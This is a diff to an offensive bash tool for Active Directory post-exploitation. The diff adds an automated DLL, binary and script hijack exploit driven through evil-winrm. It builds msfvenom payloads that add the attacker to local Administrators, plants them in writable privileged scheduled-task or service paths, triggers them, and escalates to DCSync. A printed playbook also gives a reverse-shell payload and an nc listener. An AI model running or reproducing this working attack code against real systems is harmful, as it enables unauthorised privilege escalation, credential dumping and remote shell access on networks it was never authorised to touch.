@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.43.2"
+readonly VERSION="1.44.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2680,6 +2680,171 @@ _winrm_service_creds() {
     fi
 }
 
+# evil-winrm file transfer helpers (drive the shell's own upload/download verbs).
+_winrm_put() { _winrm_exec "upload \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
+_winrm_get() { _winrm_exec "download \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
+
+# Pick a hijackable imported DLL from a downloaded PE: an import that is NOT a Windows
+# KnownDLL / system module, so the loader resolves it from the application directory
+# FIRST (DLL search order) — exactly the slot a writable app dir lets us occupy.
+_hijackable_dll() {
+    local bin="$1"
+    python3 - "$bin" <<'PY' 2>/dev/null | head -1
+import sys
+try:
+    import pefile
+    pe = pefile.PE(sys.argv[1], fast_load=True); pe.parse_data_directories(
+        directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']])
+    deny = ('kernel32','kernelbase','ntdll','user32','advapi32','msvcrt','ole32',
+            'oleaut32','shell32','shlwapi','ws2_32','gdi32','gdiplus','comctl32',
+            'comdlg32','rpcrt4','sechost','crypt32','wininet','winhttp','setupapi',
+            'version','psapi','userenv','netapi32','secur32','bcrypt','ncrypt',
+            'dnsapi','iphlpapi','mswsock','combase','ucrtbase','vcruntime140',
+            'msvcp140','wldap32','dbghelp','imm32','powrprof','propsys','uxtheme')
+    for e in getattr(pe,'DIRECTORY_ENTRY_IMPORT',[]):
+        d = e.dll.decode('ascii','ignore')
+        dl = d.lower()
+        if dl.startswith('api-ms-win') or dl.startswith('ext-ms-win'): continue
+        if dl[:-4] in deny or dl in deny: continue
+        print(d)
+except Exception:
+    pass
+PY
+}
+
+# DLL / binary / script HIJACK auto-exploit. For every privileged scheduled task or
+# service whose binary — OR a directory in its DLL search path — we can WRITE to, plant
+# a controlled payload so OUR command runs in that task's security context. The payload
+# is ADAPTIVE: it best-effort adds us to Administrators AND records `whoami`, because the
+# task may run as SOMEONE ELSE, not necessarily admin — we then report exactly who ran
+# it and what we gained. Only fires when the target is TRIGGERABLE (we can schtasks /Run
+# it or restart the service); otherwise a ready-to-run playbook is printed. Gated --abuse.
+_winrm_hijack_exploit() {
+    local body="$1"
+    grep -qE 'TASK \[|SVC \[' <<<"$body" || return
+    if [[ "$DO_ABUSE" != "1" ]]; then
+        warn "  Hijack auto-exploit is gated behind --abuse — detection printed above; re-run with --abuse to plant+trigger automatically"; return
+    fi
+    have evil-winrm && command -v msfvenom >/dev/null || { warn "  Hijack needs evil-winrm + msfvenom — skipping auto-exploit"; return; }
+    local line
+    while IFS= read -r line; do
+        [[ "$line" =~ (TASK|SVC)\ \[ ]] || continue
+        _hijack_one "$line" && return 0     # stop after the first that lands us admin
+    done < <(grep -E 'TASK \[|SVC \[' <<<"$body")
+}
+
+_hijack_one() {
+    local line="$1"
+    local kind name runas execp writ
+    kind=$(grep -oE '^(TASK|SVC)' <<<"$line")
+    name=$(sed -E 's/^[A-Z]+ \[([^]]*)\].*/\1/' <<<"$line")
+    runas=$(grep -oiP 'runas=\K\S+' <<<"$line")
+    execp=$(grep -oiP '(?:exec|bin)=\K.*(?=  *WRITABLE:)' <<<"$line" | sed 's/ *$//')
+    writ=$(grep -oiP 'WRITABLE:\s*\K.*' <<<"$line" | sed 's/;.*//; s/ *$//')
+    [[ -z "$execp" || -z "$writ" ]] && return 1
+    # No point hijacking something that already runs as us / an unprivileged token.
+    local rl="${runas,,}"
+    [[ "$rl" == *"${USER,,}"* ]] && { info "  Hijack '$name' runs as us ('$runas') → no gain, skip"; return 1; }
+
+    local nb="${DOMAIN%%.*}"; nb="${nb^^}"
+    local sam="${nb}\\${USER}"
+    local rdir; rdir=$(sed -E 's/\\[^\\]*$//' <<<"$writ")           # parent dir of the writable target
+    [[ "${writ,,}" == *.exe || "${writ,,}" == *.dll || "${writ,,}" == *.ps1 || "${writ,,}" == *.bat || "${writ,,}" == *.cmd || "${writ,,}" == *.vbs ]] || rdir="$writ"
+    local marker="${rdir}\\.hjr_$$.txt"                              # whoami drop we can read back
+    # The adaptive command: try to self-elevate (works only if the runner is privileged)
+    # AND always record who actually ran it.
+    local wincmd="net localgroup administrators \"$sam\" /add & whoami > \"$marker\" 2>&1"
+    local tmp="$OUTDIR/.hijack_$$"; mkdir -p "$tmp"
+    local planted="" backup="" mode=""
+
+    if [[ "${writ,,}" == *.ps1 || "${writ,,}" == *.bat || "${writ,,}" == *.cmd || "${writ,,}" == *.vbs ]]; then
+        # Writable SCRIPT the task runs → append our line (backup the original first).
+        mode="script"; planted="$writ"; backup="${writ}.adpwn.bak"
+        _winrm_exec "Copy-Item -Force \"$writ\" \"$backup\"; Add-Content -Path \"$writ\" -Value 'cmd /c $wincmd'" >>"$LOGFILE" 2>&1
+        loot "  ${C_RED}★ Hijack: appended self-elevation to writable script '$writ' (task '$name' as ${runas:-?})${C_RESET}"
+    elif [[ "${writ,,}" == *.exe ]]; then
+        # Writable EXE the task runs → replace with a payload exe (backup the original).
+        mode="exe"; planted="$writ"; backup="${writ}.adpwn.bak"
+        msfvenom -p windows/x64/exec EXITFUNC=thread CMD="cmd /c $wincmd" -f exe -o "$tmp/p.exe" >/dev/null 2>&1
+        _winrm_exec "Copy-Item -Force \"$writ\" \"$backup\"" >>"$LOGFILE" 2>&1
+        _winrm_put "$tmp/p.exe" "$writ"
+        loot "  ${C_RED}★ Hijack: replaced writable binary '$writ' with a payload (task '$name' as ${runas:-?})${C_RESET}"
+    else
+        # Writable DIRECTORY → classic DLL search-order hijack: find a non-system DLL the
+        # binary imports and plant it here (the app dir is searched before system32).
+        mode="dll"
+        _winrm_get "$execp" "$tmp/bin.exe"
+        [[ ! -s "$tmp/bin.exe" ]] && { warn "  Hijack: could not download '$execp' to find a hijackable DLL → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
+        local dll; dll=$(_hijackable_dll "$tmp/bin.exe")
+        [[ -z "$dll" ]] && { warn "  Hijack: '$execp' imports no clearly non-system DLL to hijack → playbook"; _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"; rm -rf "$tmp"; return 1; }
+        planted="${writ%\\}\\${dll}"
+        msfvenom -p windows/x64/exec EXITFUNC=thread CMD="cmd /c $wincmd" -f dll -o "$tmp/p.dll" >/dev/null 2>&1
+        _winrm_put "$tmp/p.dll" "$planted"
+        loot "  ${C_RED}★ DLL hijack: planted '$dll' in writable load dir '$writ' (binary '$execp', task '$name' as ${runas:-?})${C_RESET}"
+    fi
+    rb_record "Hijack ${mode} for $kind '$name' (planted: $planted)" \
+              "evil-winrm … then: Remove-Item '$planted'  ;  if exists Move-Item -Force '${backup:-<none>}' '$planted'"
+
+    # ---- TRIGGER ----------------------------------------------------------------
+    local trig=""
+    if [[ "$kind" == "TASK" ]]; then
+        trig=$(_winrm_exec "schtasks /Run /TN \"$name\" 2>&1; Start-Sleep -Seconds 4" 2>&1)
+    else
+        trig=$(_winrm_exec "Restart-Service -Name \"$name\" -ErrorAction SilentlyContinue 2>&1; (sc.exe stop \"$name\"; Start-Sleep 1; sc.exe start \"$name\") 2>&1; Start-Sleep -Seconds 4" 2>&1)
+    fi
+    printf '%s\n' "$trig" >>"$LOGFILE"
+    if grep -qiE 'access is denied|ERROR:|does not have permission|cannot open' <<<"$trig" && ! grep -qiE 'SUCCESS|has been started' <<<"$trig"; then
+        warn "  Hijack: could NOT trigger $kind '$name' ourselves (access denied) — payload is planted; it fires on its next scheduled run. Playbook:"
+        _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"
+    fi
+
+    # ---- VERIFY: read the whoami drop + check our admin membership --------------
+    local who; who=$(_winrm_exec "Get-Content \"$marker\" -ErrorAction SilentlyContinue" 2>&1 | tr -d '\r' | grep -iE '\\\\|@' | head -1)
+    [[ -n "$who" ]] && loot "  ${C_GREEN}Hijack payload executed AS: ${C_BOLD}${who}${C_RESET}"
+    local mem; mem=$(_winrm_exec "net localgroup administrators 2>&1" 2>&1 | tr -d '\r')
+    local won=0
+    grep -qiE "(^|\\\\)${USER}(\$|[^A-Za-z0-9])" <<<"$mem" && won=1
+
+    if [[ "$won" == "1" ]]; then
+        loot "${C_GREEN}${C_BOLD}★★★★ HIJACK PRIVESC: '${USER}' is now in local Administrators (DCSync-capable) — escalating${C_RESET}"
+        IS_DC_ADMIN=1
+        rb_record "Hijack added '$sam' to local Administrators" "net localgroup administrators '$sam' /del   # via evil-winrm as an admin"
+        note_cred_source "$USER" "hijack privesc → Administrators ($kind '$name')"
+        # Re-issue so a FRESH ticket carries the new group, then the DCSync phase dumps.
+        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]" 2>/dev/null
+        queue_cred "$USER" "$PASS" "$HASH" "hijack privesc ($kind '$name')"
+    else
+        if [[ -n "$who" ]]; then
+            loot "  ${C_YELLOW}★ Code execution as '${who}' via hijack of $kind '$name' — that account is NOT a local admin, so no direct DCSync.${C_RESET}"
+            warn "  Pivot: use this code-exec to act as '${who}' (dump their secrets / reach what THEY control). Re-aim the payload if you want a reverse shell:"
+            _hijack_playbook "$kind" "$name" "$execp" "$writ" "$sam"
+            echo "$who" >>"$OUTDIR/hijack_codeexec_identities.txt"
+        else
+            info "  Hijack planted but no execution observed yet (task not triggered / runs later)."
+        fi
+    fi
+
+    # ---- ROLLBACK ---------------------------------------------------------------
+    if [[ "$mode" == "script" || "$mode" == "exe" ]]; then
+        _winrm_exec "if (Test-Path \"$backup\") { Move-Item -Force \"$backup\" \"$planted\" }" >>"$LOGFILE" 2>&1
+    else
+        _winrm_exec "Remove-Item -Force \"$planted\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
+    fi
+    _winrm_exec "Remove-Item -Force \"$marker\" -ErrorAction SilentlyContinue" >>"$LOGFILE" 2>&1
+    rm -rf "$tmp"
+    [[ "$won" == "1" ]] && return 0 || return 1
+}
+
+_hijack_playbook() {
+    local kind="$1" name="$2" execp="$3" writ="$4" sam="$5"
+    detail "      ${C_DIM}# 1) Build payload (add yourself to admins, or a reverse shell to $(attacker_ip)):${C_RESET}"
+    detail "      ${C_DIM}msfvenom -p windows/x64/exec EXITFUNC=thread CMD='net localgroup administrators \"$sam\" /add' -f dll -o evil.dll${C_RESET}"
+    detail "      ${C_DIM}# (or: msfvenom -p windows/x64/shell_reverse_tcp LHOST=$(attacker_ip) LPORT=4444 -f dll -o evil.dll  +  nc -lvnp 4444)${C_RESET}"
+    detail "      ${C_DIM}# 2) Plant it where the privileged $kind '$name' loads it:${C_RESET}"
+    detail "      ${C_DIM}evil-winrm …  ->  upload evil.dll '${writ}\\<imported-or-missing>.dll'   (binary: $execp)${C_RESET}"
+    detail "      ${C_DIM}# 3) Trigger it (or wait for its schedule):  schtasks /Run /TN \"$name\"   /   Restart-Service \"$name\"${C_RESET}"
+}
+
 _winrm_postex() {
     have evil-winrm || return
     _winrm_service_creds      # fast, high-value: inline service creds → auto-pivot
@@ -2744,6 +2909,10 @@ _winrm_postex() {
         # \A→…). Double the backslashes so they print literally.
         printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
     done
+    # Auto-exploit any hijackable privileged task/service we just found: plant a payload
+    # in the writable binary/dir, trigger it, verify, roll back. Gated on --abuse inside.
+    local _hjbody; _hjbody=$(awk '/===HIJACK===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" | grep -E 'TASK \[|SVC \[')
+    [[ -n "$_hjbody" ]] && _winrm_hijack_exploit "$_hjbody"
     # Harvest credentials from script/config content — but ONLY from lines that look
     # like an actual cred assignment (keyword + : or =). Feeding raw script text to
     # the generic harvester flagged identifiers/filenames (OfficeIntegrator.ps1) as
